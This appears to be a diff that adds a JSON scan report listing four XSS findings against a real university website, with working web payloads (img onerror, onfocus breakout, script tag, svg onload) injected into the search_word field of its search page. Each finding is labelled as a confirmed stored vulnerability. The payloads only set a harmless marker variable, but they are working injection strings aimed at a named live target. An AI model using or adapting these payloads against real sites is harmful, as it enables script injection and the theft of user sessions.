@@ -1,0 +1,62 @@
+{
+  "target": "https://sdu.edu.az",
+  "timestamp": "2026-07-31T11:11:31.633568",
+  "vulnerabilities": [
+    {
+      "type": "STORED",
+      "url": "https://sdu.edu.az/az/search",
+      "param": "search_word",
+      "payload": "\"><img src=x onerror=\"window.__xss_s2='STORED_ae34e11f'\">",
+      "payload_type": "stored_breakout2",
+      "method": "POST",
+      "status": 200,
+      "waf": [
+        "Cloudflare"
+      ],
+      "marker": "STORED_ae34e11f",
+      "reason": "100% Təsdiqlənmiş XSS Zəifliyi"
+    },
+    {
+      "type": "STORED",
+      "url": "https://sdu.edu.az/az/search",
+      "param": "search_word",
+      "payload": "\" autofocus onfocus=\"window.__xss_s4='STORED_ae34e11f'",
+      "payload_type": "stored_breakout4",
+      "method": "POST",
+      "status": 200,
+      "waf": [
+        "Cloudflare"
+      ],
+      "marker": "STORED_ae34e11f",
+      "reason": "100% Təsdiqlənmiş XSS Zəifliyi"
+    },
+    {
+      "type": "STORED",
+      "url": "https://sdu.edu.az/az/search",
+      "param": "search_word",
+      "payload": "\"><script>window.__xss_s1=\"STORED_ae34e11f\";</script>",
+      "payload_type": "stored_breakout1",
+      "method": "POST",
+      "status": 200,
+      "waf": [
+        "Cloudflare"
+      ],
+      "marker": "STORED_ae34e11f",
+      "reason": "100% Təsdiqlənmiş XSS Zəifliyi"
+    },
+    {
+      "type": "STORED",
+      "url": "https://sdu.edu.az/az/search",
+      "param": "search_word",
+      "payload": "'><svg onload=\"window.__xss_s3='STORED_ae34e11f'\">",
+      "payload_type": "stored_breakout3",
+      "method": "POST",
+      "status": 200,
+      "waf": [
+        "Cloudflare"
+      ],
+      "marker": "STORED_ae34e11f",
+      "reason": "100% Təsdiqlənmiş XSS Zəifliyi"
+    }
+  ]
+}
